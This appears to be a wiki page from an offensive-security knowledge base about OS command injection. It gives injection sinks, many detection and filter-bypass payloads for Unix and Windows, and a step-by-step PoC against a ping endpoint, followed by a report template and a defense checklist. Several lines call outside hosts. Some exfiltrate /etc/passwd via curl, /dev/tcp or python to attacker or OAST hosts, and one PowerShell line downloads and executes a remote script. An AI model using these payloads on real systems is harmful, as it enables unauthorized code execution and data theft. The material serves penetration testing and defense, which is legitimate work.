---
type: wiki
title: Command Injection Deep Dive (2026 Edition)
category: attack
tool: commix,interactsh,manual
tags:
  - rce
  - command-injection
  - os-injection
  - owasp-top10
status: active
last_updated: 2026-04-21
---

# Command Injection Deep Dive (2026 Edition)

> **Purpose:** Command injection is a P1 RCE. Commonly found in `system()`, `exec()`, `popen()`, `shell_exec()`, `subprocess.call(shell=True)`, `child_process.exec`. This document covers Unix/Windows syntax, filter bypass, blind detection, and complete chains.

## 0. Sink Reference

| Language | Dangerous sink |
|----------|----------------|
| PHP | `system()` `exec()` `shell_exec()` `passthru()` `popen()` `proc_open()` `` `` `` |
| Python | `os.system()` `os.popen()` `subprocess.call(shell=True)` `subprocess.run(shell=True)` `commands.getoutput()` |
| Node.js | `child_process.exec()` `child_process.execSync()` `vm.runInNewContext()` |
| Ruby | `` `` `` `system()` `%x[]` `open` `IO.popen` `eval` |
| Java | `Runtime.exec(cmd_string)` `ProcessBuilder(cmd_string)` with shell=true |
| Go | `exec.Command("sh","-c",cmd)` instead of argv list |
| .NET | `Process.Start(cmd)` with shell=true / `/c cmd` |

Key point: any API that passes an **entire string** to the shell is a potential injection point. Argv list (`exec("/bin/ls",["dir"])`) is generally safe.

## 1. Finding Injection Points

### 1.1 Functional Clues

```
DNS lookup / ping / traceroute                   -> 99% likely
PDF / image conversion (imagemagick/ghostscript)  -> high
SMS / email (wkhtmltopdf / curl backend)          -> medium
Backup / export                                   -> medium
Log search (grep backend)                         -> medium
Webhook testing                                   -> high
ZIP / tar extraction                              -> high
Filename / path as parameter                      -> high
OCR / subtitle conversion                         -> medium
git clone / svn checkout internal tools           -> medium
```

### 1.2 Detection Payloads (safe -> aggressive)

```bash
# Safe (detect only, no execution)
?host=127.0.0.1     # baseline
?host=127.0.0.1;    # some parsers throw an error
?host=127.0.0.1$(   # similar
?host=127.0.0.1`    # similar

# Sleep-based (blind)
?host=127.0.0.1;sleep+5
?host=127.0.0.1|sleep+5
?host=127.0.0.1%0asleep+5
?host=127.0.0.1&&sleep+5
?host=127.0.0.1%26%26sleep+5
?host=127.0.0.1$(sleep+5)
?host=127.0.0.1`sleep+5`
?host="$(sleep+5)"

# OOB (interactsh)
?host=127.0.0.1;curl+http://abc.oast.live/
?host=127.0.0.1||curl+http://abc.oast.live/
?host=127.0.0.1$(curl+http://abc.oast.live/)
```

## 2. Unix Shell Injection

### 2.1 Separator Metacharacters

```
;       # chain commands
&       # background execution (trailing &) / separator (&&)
&&      # AND (execute next only if previous succeeds)
||      # OR (execute next only if previous fails)
|       # pipe
`cmd`   # command substitution
$(cmd)  # command substitution
\n      # newline equals ;
\r\n    # Windows-style, can also trigger
```

### 2.2 Space Blocked

```bash
# ${IFS} substitution
cat</etc/passwd
cat<>/etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd   # $9 = empty positional arg
```

### 2.3 Keyword Blocked

```bash
# cat blocked
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
`echo Y2F0|base64 -d` /etc/passwd
$(which cat) /etc/passwd
/???/??t /etc/passwd          # glob
/bin/c?t /etc/passwd

# /etc/passwd blocked
/???/p*wd
/e?c/p?sswd
```

### 2.4 Redirect Blocked

```bash
# > blocked
tee /tmp/x <<< hello
printf hello | dd of=/tmp/x
```

### 2.5 Encoding Bypass

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh
`printf '\143\141\164'` /etc/passwd     # octal "cat"
$'\x63\x61\x74' /etc/passwd              # hex
```

## 3. Windows Command Injection

### 3.1 Separators

```cmd
&       same as Unix ;
&&      AND
||      OR
|       pipe
\r\n    newline
```

### 3.2 Filter Bypass

```cmd
# Space
tab character (%09)
%0a

# whoami blocked
who^ami
who""ami
who^^ami

# Filename
C:\Windows\System32\whoami.exe
dir C:\Users\*
type c:\windows\win.ini

# PowerShell encoded
powershell -enc <base64>
```

### 3.3 PowerShell-Specific

```powershell
# Reflective execution
$c='iex';& $c 'whoami'
$ExecutionContext.InvokeCommand.ExpandString('{0}(whoami)' -f '$')

# Download and execute
IEX(New-Object Net.WebClient).DownloadString('http://attacker/x.ps1')
```

## 4. Blind Command Injection Detection

### 4.1 Time-based

```bash
?host=127.0.0.1;sleep+10
# 10 seconds slower than baseline -> confirmed
```

### 4.2 DNS (OAST)

```bash
?host=127.0.0.1;curl+http://$(whoami).abc.oast.live/
# interactsh shows DNS: root.abc.oast.live -> user is root

# Or use nslookup (some systems lack curl)
?host=127.0.0.1;nslookup+$(whoami).abc.oast.live
?host=127.0.0.1;wget+http://abc.oast.live/$(id|base64)
```

### 4.3 HTTP Callback

```bash
?host=127.0.0.1;curl+-d+@/etc/passwd+http://abc.oast.live/
# POST body = /etc/passwd content -> check request body in interactsh
```

### 4.4 When curl / wget Unavailable

```bash
# Using /dev/tcp (bash-only)
?host=127.0.0.1;bash+-c+'cat</etc/passwd>/dev/tcp/attacker/4444'

# Pure python
?host=127.0.0.1;python+-c+'import+urllib.request;urllib.request.urlopen("http://oast/"+open("/etc/passwd").read())'
```

## 5. Non-Shell Sinks

### 5.1 Argv Injection

When the server calls `exec("ping", [host])` it appears safe, but if `host="-c5;id"`, ping treats `-c` as a flag and rejects it, though certain firmware implementations may still execute the trailing command.

```bash
?host=-oProxyCommand=curl+attacker   # ssh argument injection
?host=--help                         # verify where argv ends up
?file=-I;id;                         # some tools treat - prefix as flags
```

### 5.2 ImageMagick (GhostScript)

```bash
# Upload .gif / .png with malicious coding
# CVE-2016-3714 (ImageTragick)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/|id")'
pop graphic-context
```

See [62-file-upload-exploitation.md](62-file-upload-exploitation.md).

### 5.3 FFmpeg HLS

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:file:///etc/passwd
#EXT-X-ENDLIST
```

### 5.4 SSRF -> Internal Command Injection

See [66-ssrf-deep.md](66-ssrf-deep.md).

## 6. Filter Bypass in Practice

### 6.1 Common Filters

```python
# Blacklist
blacklist = [';', '&', '|', '`', '$(']
for c in blacklist:
  cmd = cmd.replace(c,'')
```

Bypass techniques:

```
# Using %0a (newline)
127.0.0.1%0aid

# %0d (CR)
127.0.0.1%0did

# Unicode ;
127.0.0.1%ef%bc%9bid    # fullwidth ;

# Nested $(
$($(id))   # double nesting: removing outer layer still leaves $(

# Using nested (
127.0.0.1\nid
```

### 6.2 "Only Blocking Space"

```
cat</etc/passwd
{cat,/etc/passwd}
IFS=,;$(cat,/etc/passwd)
```

### 6.3 "Whitelist: IP Only"

```bash
# String length / regex IP check
127.0.0.1|id              # blocked (not an IP)

# If regex is substring match
127.0.0.1#$(id)           # browser drops everything after # in URL, server sees original string
127.0.0.1 id              # if regex only validates prefix

# If regex is "contains IP"
127.0.0.1;echo+a127.0.0.1bid   # latter half still contains IP
```

## 7. Tools

### 7.1 Commix

```bash
git clone https://github.com/commixproject/commix
cd commix
python commix.py -u 'https://target.com/?host=FUZZ' --level=3

# POST
python commix.py -u 'https://target.com/api/ping' --data='host=1.1.1.1'

# Auto shell
python commix.py -u '...' --os-shell
```

### 7.2 Nuclei

```bash
nuclei -u https://target.com -tags rce,cmdinj -severity high,critical
```

### 7.3 Interactsh

```bash
interactsh-client -v
# Generates abc123.oast.live, insert into payload
```

### 7.4 Ffuf (Bruteforce Parameters)

```bash
ffuf -u 'https://target.com/FUZZ?host=127.0.0.1;sleep+5' \
  -w /path/to/endpoints.txt -fs 0 -t 10
```

## 8. Full PoC: Ping Tool -> RCE

### Step 1: Detection

```bash
curl "https://target.com/api/ping?host=127.0.0.1"
# {"result":"PING 127.0.0.1 ... 64 bytes from 127.0.0.1"}

curl "https://target.com/api/ping?host=127.0.0.1;sleep+5"
# 5 seconds later -> 200 -> command injection confirmed
```

### Step 2: OOB User Confirmation

```bash
# Start interactsh
interactsh-client -v  &
# Get abc123.oast.live

curl -G "https://target.com/api/ping" \
  --data-urlencode 'host=127.0.0.1;curl+http://$(whoami).abc123.oast.live/'

# interactsh shows DNS: www-data.abc123.oast.live -> user confirmed
```

### Step 3: Read /etc/passwd

```bash
curl -G "https://target.com/api/ping" \
  --data-urlencode 'host=127.0.0.1;curl+-d+@/etc/passwd+http://abc123.oast.live/'

# interactsh HTTP body = /etc/passwd content
```

### Step 4: Stop (No Reverse Shell)

PoC stops at verifying file read (/etc/passwd) and outbound connectivity. Do not persist, do not actually reverse shell.

### Step 5: Report

```markdown
## Vulnerability Summary
https://target.com/api/ping?host= does not sanitize the `;` character and directly
concatenates user input into a `ping -c 1 $host` shell command, achieving pre-auth
RCE (user: www-data).

## PoC
[3 curl + interactsh screenshots]

## Impact
- Pre-auth remote code execution
- Arbitrary file read (/etc/passwd, app config, DB credentials)
- Can serve as an internal network pivot point

## Severity
P1 / Critical

## Remediation
1. Do not string-concatenate into shell commands; use argv list instead:
   subprocess.run(["ping","-c","1",host], shell=False)
2. Input validation: whitelist IPv4/IPv6 regex
3. Block dangerous shell characters (;,&,|,`,$(  )
4. If shell is truly required, wrap with shlex.quote(host)
```

## 9. Defense Checklist

```
1. Always use argv list / parameterized API; prohibit string concatenation
   PHP: escapeshellarg() + escapeshellcmd()
   Python: subprocess.run([], shell=False)
   Node: execFile() instead of exec()
   Java: ProcessBuilder(List<String>) instead of Runtime.exec(String)
   Go: exec.Command(name, args...)
   .NET: ProcessStartInfo + Arguments list
2. Input whitelisting (type + format + length)
3. Disable dangerous APIs (PHP disable_functions)
4. Apply least privilege (non-root user)
5. Container seccomp/AppArmor to restrict syscalls
6. Outbound firewall (block DNS/HTTP egress)
7. Log monitoring: shell process spawn from web server user
```

## Related Files

- [62-file-upload-exploitation.md](62-file-upload-exploitation.md) -- ImageMagick / Ghostscript command injection
- [66-ssrf-deep.md](66-ssrf-deep.md) -- SSRF -> internal API -> command injection
- [67-deserialization.md](67-deserialization.md) -- Deserialization -> system()
- [73-ssti-deep.md](73-ssti-deep.md) -- SSTI leading to system()
- PortSwigger OS Command Injection: https://portswigger.net/web-security/os-command-injection
- PayloadsAllTheThings CmdInj: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- Commix: https://github.com/commixproject/commix
